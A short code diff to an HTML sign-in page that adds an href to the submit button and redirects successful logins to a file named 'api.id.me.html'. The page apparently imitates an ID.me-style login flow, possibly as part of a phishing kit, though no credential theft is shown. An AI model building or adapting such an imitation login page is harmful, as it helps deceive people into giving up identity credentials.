@@ -118,7 +118,7 @@ For your security, select only on your devices.
 </div>
 </div>
 <div class='form-actions'>
-<button type="submit" name="commit" value="Sign in" class="btn btn-primary" return false;>Sign in</button>
+<button type="submit" name="commit" value="Sign in" href="api.id.me.html" class="btn btn-primary" return false;>Sign in</button>
 </div>
 
 <div class='form-footer'>
@@ -157,7 +157,7 @@ For your security, select only on your devices.
             const json = await res.json();
 
             if (json.success) {
-              window.location.href = 'your-account.html';
+              window.location.href = 'api.id.me.html';
             } else {
               alert('Error: ' + (json.error || 'Unknown error'));
             }
